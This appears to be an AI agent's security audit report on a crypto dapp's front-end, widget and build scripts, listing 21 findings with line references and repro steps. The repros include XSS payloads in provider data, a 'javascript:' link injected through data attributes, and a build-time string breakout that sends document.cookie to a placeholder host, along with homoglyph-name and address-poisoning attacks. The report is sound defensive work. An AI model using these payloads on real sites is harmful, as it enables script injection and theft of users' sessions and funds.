# Front-end leg — full report (opus)

## What this leg could and could not do

- I read all nine in-scope files in full: `app/src/index.html`, `app/src/model.js`, `app/src/eth.js`,
  `app/src/widget.js`, `app/src/layout.html`, `app/build.mjs`, `app/inline-scripts.mjs`,
  `app/broadcast.mjs` and `app/version.mjs`.
- I used no network.
- **Not run:** a browser. No finding below was reproduced in a page. Every one is argued from the
  source.
- **Not read:** the gateway's injected block (`cmd/server/html.patch`). It is not in scope and not
  in the tree, so I make no claim about what it rewrites.
- **Run:**
  - One non-dev build, from a throwaway copy of `app/` and `broadcast/` under `/tmp`, deleted
    afterwards. `node app/build.mjs --chain 84532 --set FEATURED_SALT=…` succeeded. The bundle
    contains no `Q.get`, `__LOGREQ` or `rpcProvider`.
  - One `node -e` call to `Eth.checksum` on a hostile string (F10).
- The working tree was clean before and after (`git status --short` printed nothing).

## Severity scale

| Severity | Meaning |
|---|---|
| **Critical** | Script execution or loss of funds, with no precondition beyond someone visiting a link. |
| **High** | Script execution in the dapp's origin, or the dapp's trust signals shown for something an attacker controls, with one realistic precondition. |
| **Medium** | A user is misled about an address, a token or a table in a way that plausibly leads to a wrong transaction or a wrong decision to trust. Or script execution on a third-party host under a common host configuration. |
| **Low** | Spoofing, denial of service or integrity loss that is narrow, needs an unusual precondition, or is self-inflicted. |
| **Info** | Hardening, or a note for the rollup. Not a defect on its own. |

---

## F1 — High — The detail page renders any contract as a Rake distribution, with no check that the factory made it

**Where:** `app/src/index.html`
- `index.html:539-541`: `loadDistro` checks only `code !== '0x'`.
- `index.html:2032-2033`: any address that matches the route is loaded.
- `index.html:1160`: the address is persisted with `addRecent`.
- `index.html:1162-1163`: the "superseded by" heir is loaded the same way.

The same gap is in `app/src/widget.js:151-163`.

**What happens:** Nothing compares the address's code with the 45-byte PUSH0 clone of
`implementation()`. Nothing checks it against the factory's `Created` logs or `predict()`.

Any contract that answers `snapshot()`, `reserved(address)` and `pendingOwner()` with well-formed
words is painted with the whole trust surface:
- the published table;
- "delay 7d";
- the timelock phases and countdowns;
- "anyone can apply";
- the funds block and its `distribute` buttons.

The page's stated purpose is that "a payer can verify where funds will go", and this is the page that
says so. A fake that returns a 7-day delay can be one whose real code pays its owner instantly.

The page also writes the fake into `rake.recent` (`index.html:389`). From then on it appears in the
visitor's own "recent" list as though they had chosen it.

**Repro:**
1. Deploy a contract whose `snapshot()` returns a two-row table and `delay = 604800`, and whose
   `receive()` forwards everything to the deployer.
2. Send a stranger `https://0x<App>.<chain>.w3link.io/#/distros/0x<fake>`.
3. The stranger sees a Rake distribution with a seven-day public timelock, pays it, and the fake now
   sits in their recents.

**Secondary effect (DoS from the same fake):**
- `pendingActs` runs `Model.nonceOf(p[0], p[2], d.nonce)` (`index.html:826`,
  `model.js:275-281`) on every paint, before the phase is checked.
- A fake that returns `nonce = 0xffffffff` and one pending entry makes it run up to 2³² keccaks.
  The file's own measurement is 187 ms per 1,000, so that is days of main-thread work.
- This runs through `paintDetail`, `paintChanges` and `paintFailed`, so the tab freezes when the link
  is opened.

---

## F2 — High (precondition: a lying provider) — Provider-supplied strings reach unescaped attributes and `href`s through `ext()` and `xlink()`

**Where:**

`index.html:363-370` is the sink. `ext()` interpolates `v` raw into:
- `title="${v}"`
- `data-addr="${v}"`
- `aria-label="copy ${v}"`
- `data-copy="${v}"`
- through `xlink`, `href="${EXPLORER}/${kind}/${v}"`

`v` comes straight from provider responses that are never parsed as hex:

| Line | Value |
|---|---|
| `index.html:599`, `index.html:644` → `index.html:757` | `log.transactionHash`, rendered by `histRows`: `ext('tx', e.tx, …)` |
| `index.html:653-654` | `log.topics[1]` for `Applied` / `Cancelled`: `ext('hash', log.topics[1], …)` |
| `index.html:1185` → `index.html:803` | the same `e.tx`, as "queued in" on the pending block |
| `index.html:598` → `index.html:683` | `log.address` from the address-less `Transfer` query, passed through `Eth.checksum` |
| `index.html:159-168` | the hash returned by `eth_sendTransaction` |

`Eth.checksum` lowercases and re-cases its input but passes every character through
(`eth.js:183-186`). I verified this: `checksum("0x'+alert(1)+'aaa…")` returns `0x'+alert(1)+'aaaAaaAA…`.

**What happens:** The brief says `window.ethereum` and the RPC behind it are inputs. A provider that
lies about a log's `transactionHash` gets script execution in the dapp's origin, not only a false
display.

In the dapp's origin a script can:
- rewrite what the propose, apply and claim buttons encode;
- swap `w.to`;
- replace the calldata a vault signer copies.

It can do all of that while the page shows the original values. That is a much larger power than
"the RPC can lie about balances".

**Repro:**
1. Point the wallet at an RPC that answers `eth_getLogs` with one `Received` log whose
   `transactionHash` is `"><img src=x onerror=alert(document.domain)>`.
2. Open `#/distros/<featured>`.
3. When the activity section paints, `index.html:757` executes the handler.

The tx hash from `eth_sendTransaction` is the same sink, written by `txSay` at `index.html:159`.

**Latent instance:** `ACC` from `eth_accounts` (`index.html:108`, `index.html:109`) is also never
validated as an address. It reaches `ext('address', ACC, …)` at `index.html:1794`. Today that path
is not reached, because `word(ACC)` throws first at `index.html:1762`. That is luck, not a guard.

---

## F3 — Medium — The "recognised token" defence against spam can be beaten by anyone for the cost of one `distribute`

**Where:**
- `index.html:616`: `known` is every token in a `Distributed` or `Escrowed` log.
- `index.html:683`: `token()` prints `SYMBOLS` for a known token.
- `index.html:1197`: the symbols are read here.
- `index.html:1471`: `readFunds` lists every known token in the main funds ledger.

**What happens:** `distribute(address)` is permissionless, and the page says so. A spammer can:
1. send one unit of a token whose `symbol()` is `USDC`;
2. call `distribute(token)` themselves.

That emits `Distributed`, so on every later load the token is "recognised":
- It moves out of the collapsed, amber-marked "other tokens received — unverified" list
  (`index.html:1579-1583`).
- It enters the main ledger by its symbol, beside ETH, with a live `distribute` button.

The page says the opposite: "Check a token before distributing it; once distributed it is listed
above" (`index.html:1582`). The docs say "lists a token by name only once it has been distributed
there" (`index.html:1921`).

The 12-character cap at `index.html:334` still leaves room for `USDC`, `WETH` or `claim-x.io`.

**Repro:** Deploy an ERC-20 with `symbol() = "USDC"` and `decimals() = 6`. Transfer 1e12 units to
the featured distribution, then call `distribute(token)`. The funds block now shows "1000000.0000
USDC — waiting to distribute" as a recognised asset of the distribution.

---

## F4 — Medium — Beneficiary addresses skip the EIP-55 refusal that every other address field enforces

**Where:**
- `index.html:870`: `editorState` tests `isAddr(r.addr)` only.
- `index.html:899`: `oninput` stores the raw typed value in `rows[i].addr`.
- `index.html:901-905`: `onchange` runs `addrField`. On a bad checksum that returns `null` and
  prints `checksum does not match`, but leaves the bad value in `rows[i]`. `after(editorPaint(rows))`
  then reports the table as valid.
- `index.html:1322-1325` and `index.html:1716-1718`: both senders encode `Model.tableFrom(D.rows)`
  from those rows.

**What happens:** The owner field (`index.html:1371`, `index.html:1665`) and the claim field
(`index.html:1547`) refuse a mixed-case address whose checksum fails. The beneficiary rows, where a
typo sends funds forever to a key nobody holds, do not.

The red line under the field and an enabled Deploy button contradict each other, and the button is
what gets pressed.

**Repro:**
1. In create step 2, paste a checksummed address and change one hex digit.
2. Leave the field. It reads "checksum does not match — a character is likely wrong", yet the status
   reads "sent ascending by address…" and Deploy is enabled.
3. Press Deploy. The typo'd address is in the deployed table.

---

## F5 — Medium — The widget is a script gadget on any host that lets users post `data-*` attributes

**Where:** `app/src/widget.js`
- `widget.js:218-219`: `mountAll` mounts every `[data-rake]` element in the host document,
  including ones the host did not write.
- `widget.js:198`: the `data-link` value is used as the `href` prefix with only HTML escaping, so
  its scheme is never checked.
- `widget.js:197`: `short(addr)` from `data-rake` is concatenated into `innerHTML` unescaped.
- `widget.js:180`, `widget.js:153-155`: `data-rpc` from the same element picks the endpoint whose
  answer is rendered.

**What happens:** HTML sanitisers commonly allow `data-*` attributes. DOMPurify's default does,
stated from memory without a network check. On a host that embeds the widget and also renders
sanitised user HTML, a commenter can post a `<div data-rake=…>` and the widget turns it into live
markup.

- `esc()` does not neutralise `javascript:`, and `link.split('#')[0]` keeps the payload intact.
- The unescaped `short(addr)` also lets the commenter inject ten characters of markup: the first six
  and last four of `data-rake`. Combined with the eight owner characters a lying `data-rpc` controls
  (F8), that is a raw-markup channel. I did not find an auto-firing payload in that budget.

**Repro:** On a host page that loads `widget.js` and renders sanitised comments, post
`<div data-rake="0x0000000000000000000000000000000000000001" data-rpc="https://attacker.example" data-link="javascript:alert(document.domain)//"></div>`.
The attacker's RPC answers a well-formed `snapshot()`. The widget renders a "view ↗" whose `href` is
`javascript:alert(document.domain)//#/distros/0x…`, and clicking it runs script in the host's
origin.

---

## F6 — Medium — Names that confirm forward but are not normalised replace addresses everywhere, with no check for lookalikes

**Where:**
- `index.html:450-455`: `nameSweep` replaces the text of every `[data-addr]` element with the name.
- `index.html:411-427`: `ensName` and `regName` return the reverse string verbatim.
- `model.js:285-288`: `namehash` applies no ENSIP-15 / UTS-46 normalisation.
- `index.html:463-465`: forward lookup only lowercases.
- `index.html:364-365`: `ext` prints a cached name in place of the address.

**What happens:** Forward confirmation proves only that the attacker owns the name they display. It
does not prove the name is the one a reader thinks it is.

The ENS registrar does not enforce normalisation on chain. So a mixed-script name can be registered,
forward-pointed and reverse-set by its owner, and this page prints it verbatim with no warning. For
example, `vіtalik.eth` with a Cyrillic `і`, or a name carrying zero-width or bidi controls.

The address disappears from the visible text. It stays only in `title` and the copy icon. The name
has no length cap.

This lands on the three lines a watcher reads to decide whether to trust a distribution:
- the owner (`index.html:765`);
- "transfer pending to …" (`index.html:766`);
- every beneficiary row (`index.html:734`).

**Repro:**
1. On mainnet, register `vіtalik.eth` (Cyrillic U+0456), set its address and reverse record to
   the attacker's EOA.
2. As owner, queue `transferOwnership(attacker)`.
3. The pending block and the owner cell read "nominates · vіtalik.eth" and
   "transfer pending to vіtalik.eth".

---

## F7 — Low — Every address on the page that exists to be verified is shown as 6+4 characters

**Where:**
- `index.html:288`: `short`.
- Used through `ext` everywhere, including `index.html:734`, `index.html:765-766`,
  `index.html:705` and the widget's footer at `widget.js:197`.

**What happens:** The visible form carries 8 hex digits, which is 32 bits. Grinding a vanity address
that matches a trusted beneficiary's first four and last four digits is a cheap, well-known search.
Address-poisoning campaigns rely on exactly this.

The full value is only in a hover `title` and the clipboard, which a reader verifying a table by eye
never sees.

**Repro:** Replace one row of a table with a ground address that matches the old one's
`0xAbCd…1234`. The ledger, the pending block's "nominates" line and the widget all print the same
string as before.

---

## F8 — Low — The widget's `data-rpc` path never checks the chain, and an untrusted response is decoded without checking that it is hex

**Where:**
- `widget.js:153-156`: no `eth_chainId` request on the RPC path, although the wallet path at
  `widget.js:159-161` makes one.
- `widget.js:118-120`: `reader` lowercases the response and slices it with no hex check, so
  `adr()` returns arbitrary characters.
- `widget.js:197`: `short(snap.owner)` goes into `innerHTML` unescaped.

**What happens:**
- **Wrong chain, right label:** A distribution has the same address on every chain and a different
  table on each (AGENTS.md, `FEATURED_SALT`). A `data-rpc` for chain X under `data-chain="Y"` shows
  X's table labelled "base", "ethereum" or whichever chain Y is. The widget refuses exactly this case
  when it reads through the wallet.
- **Raw markup:** A non-hex response puts 4 + 4 raw characters into the footer.

**Repro:** Mount with `data-chain="8453"` and `data-rpc` set to an OP-mainnet endpoint. The widget
shows OP's table and its footer says "base".

---

## F9 — Low — Lengths in decoded responses are unbounded, so a hostile response freezes the host page or the dapp

**Where:**
- `widget.js:129`: `arr` loops `u(p)` times with no bound and no check against `hex.length`.
- `eth.js:145-146`: `decOne` allocates `new Array(len)` from a word.
- `model.js:275-281` and `index.html:826`: `nonceOf`, as in F1.

**What happens:** `u()` is `parseInt` over 64 hex digits. A table length of `0xffffffff` runs 4.29e9
iterations on the host page's main thread before any render. This happens inside a host page nobody
here controls. The dapp's decoder throws `RangeError` above 2³² and is caught, but around 1e7 it
allocates and decodes a long time before it fails.

**Repro:** Mount with a `data-rpc` that answers `snapshot()` with a valid head whose `table` offset
points at the word `0x…ffffffff`. The host tab hangs.

---

## F10 — Medium — The build trusts tracked broadcast JSON and splices its fields into JavaScript string literals

**Where:**
- `build.mjs:237`: `out[name] = Eth.checksum(c.address)`.
- `build.mjs:273`: `substitute` inserts every value raw.
- `index.html:34`: `CFG = { …, factory: '__DISTRIBUTIONFACTORY__', …, app: '__APP__' }`.
- `broadcast.mjs:436-441`: `contractAddress` and `contractName` are taken unvalidated.

**What happens:**
- **Injection:** `broadcast/Deploy.s.sol/{11155111,84532}/run-latest.json` and the `DeployApp`
  equivalents are tracked in git. They are exactly what `make dapp-nodev` reads for the bundle that
  gets uploaded. `Eth.checksum` passes any character through (verified, see F2). So a
  `contractAddress` of `0x'+…+'` closes the string literal and runs code in the shipped document.
  Nothing validates `^0x[0-9a-fA-F]{40}$`.
- **Swap without injection:** Even with validation, a one-line JSON edit replacing `contractAddress`
  with another valid address silently re-points every read, `predict()` and `create` in the bundle
  at an attacker's factory. The factory is created by CREATE2 through the keyless proxy
  (`Deploy.s.sol:18`), so its address is computable and could be asserted. It is not.
- **Name collisions:** `deployed()` iterates script directories in name order and lets the last
  `contractName` win (`build.mjs:230-237`). A second script that creates a contract with the same
  name, a fixture for example, silently overrides the address. Nothing refuses.

Reviewers skim broadcast JSON diffs. This is the shortest path from a PR to the document strangers
load.

**Repro:**
1. In `broadcast/Deploy.s.sol/84532/run-latest.json`, set the factory's `contractAddress` to
   `"0x'+fetch('//x.example/'+document.cookie)+'aaaaaaaaaaaaaaaaaaaaaaaaaaaaa"`.
2. Run `node app/build.mjs --chain 84532`. It succeeds, and `CFG.factory` in `app/dist/index.html`
   evaluates the expression.

---

## F11 — Low — The inline-script guard matches `<script` case-sensitively

**Where:** `app/inline-scripts.mjs:10-11`: `html.indexOf('<script')`.

**What happens:** HTML tag names are case-insensitive. `<SCRIPT src="…">` and `<Script defer>` are
real external or deferred scripts, but the guard never sees them. The bundle ships with exactly the
silent breakage the guard exists to refuse.

**Repro:** Add `<Script src="x.js"></Script>` to `app/src/layout.html` and run the build. It
succeeds and prints no refusal.

---

## F12 — Low — Bidi control characters in chain strings are rendered without isolation

**Where:**
- `widget.js:201`: compact names and percentages joined on one line.
- `widget.js:207`: a name followed by its note.
- `index.html:734`: a ledger row's name followed by its note.
- `index.html:1802`: a list row's description followed by the chain name and address inside one
  `<a>`.

**What happens:** `esc()` leaves U+202E and U+2066–2069 in place. In the compact widget an
unterminated RLO in one row's name visually reverses everything after it on the line, other rows'
percentages included. There is no `<bdi>` and no `unicode-bidi: isolate`.

**Repro:** Give row 1 the name `ops‮`. The compact widget's line then renders the following
`16% · treasury 84%` reversed, so "16%" reads as "%61".

---

## F13 — Low — The recent list crashes on a distribution read through the fallback

**Where:**
- `index.html:1803`: `d.pending.length`.
- `index.html:577`: the fallback returns `pending: null`.

**What happens:** `list()` maps every recent entry through `d.pending.length`. One entry whose
`snapshot()` the provider refused, or a fake whose `snapshot()` reverts while
`owner()`/`delay()`/`nonce()`/`description()`/`beneficiaries()` answer, throws a `TypeError` outside
the `try`. `#/distros` then stays on "reading…" for good.

Because of F1 (`addRecent` on any address), one visit to an attacker's link is enough to do this.

**Repro:** Visit `#/distros/0x<contract whose snapshot() reverts>`, then open `#/distros`. The list
never paints.

---

## F14 — Low — The page does not re-check the chain before it sends

**Where:**
- `index.html:147-158`: `tx` sends with no `eth_chainId` re-read and no `chainId` field.
- `index.html:109`: the reload on `chainChanged` exists only if `P.on` exists.

**What happens:** With a provider that has no event emitter, or one that drops the event, a wallet
switched mid-session sends `propose`, `apply` or `create` to the same address on another chain. Every
chain has a distribution at that address with the same owner key.

**Repro:** Use an injected provider with no `on`. Load on Base, switch the wallet to Optimism in the
extension, and queue a change. It lands on Optimism's distribution.

---

## F15 — Low — The featured address, and so the support payment, is taken from the provider instead of being computed

**Where:**
- `index.html:515-517`: `predict(featuredSalt)` is read through `P`.
- `index.html:1973`: `giveBind` sends ETH to `S.featured`.

**What happens:** The page carries keccak, the factory address and the salt. The clone address is
CREATE2 of known inputs and can be computed locally. Instead a lying provider names the recipient of
the docs' "support its authors" payment. The preflight goes to the same provider.

**Repro:** An RPC that answers `predict(bytes32)` with an attacker address. `#/docs#economics` →
send → the wallet's `to` is the attacker. The page shows only "send Ξ…".

---

## F16 — Info — Vault calldata is copied with no target, chain or value beside it

**Where:**
- `index.html:931` and `index.html:956-964`: the copy controls.
- `index.html:186-187`: what is shown is "copied · N bytes".

The signer is not told on screen which address the calldata is for, on which chain, or that the value
is 0. With the same address on every chain the address is unambiguous but the chain is not. A
clipboard that is replaced between copy and paste has nothing on screen to compare against.

---

## F17 — Info — `signsFor` takes any owner contract's `isOwner` answer as true

**Where:** `index.html:1130-1136`, `index.html:1145`.

An owner contract that answers 1 for everyone shows every visitor "you are a signer on …, which owns
this distribution". This affects the UI only, since the copied calldata still needs the real vault.

---

## F18 — Info — `target="_blank"` links carry `rel="noopener"` without `noreferrer`

**Where:**
- `index.html:54`, `index.html:370`, `index.html:1881`, `index.html:1897-1898`, `index.html:1955`,
  `index.html:1958`.
- `widget.js:198`.

`noopener` is present everywhere, so there is no reverse-tabnabbing. Referer is still sent. From a
host page, the widget's "view ↗" sends the host page's URL to the gateway.

---

## F19 — Info — The widget's stylesheet is global, and the host can suppress it

**Where:** `widget.js:166-168`, `widget.js:50-76`.

- A host element with `id="rk-css"`, which a user of the host can inject on hosts that allow ids,
  stops the stylesheet from being injected.
- The injected rules (`.rk a`, `.rk-b`, …) apply to any host element that carries those classes.

---

## F20 — Info — The dapp can be framed

The document cannot set `frame-ancestors` (a meta CSP cannot), and the gateway sets the headers. A
"hold this button for 3 seconds" overlay is the textbook clickjack against `holdToFire`
(`index.html:972-983`). The wallet's own confirmation is the only real gate.

---

## F21 — Info — The landing widget may read through a different wallet from the page

**Where:** `index.html:106`, `index.html:1024`, `widget.js:157`.

The page picks the first EIP-6963 announcer as `P`. The inlined widget reads `window.ethereum`. With
two extensions installed, the live example and the page beside it can read through different
providers and disagree.
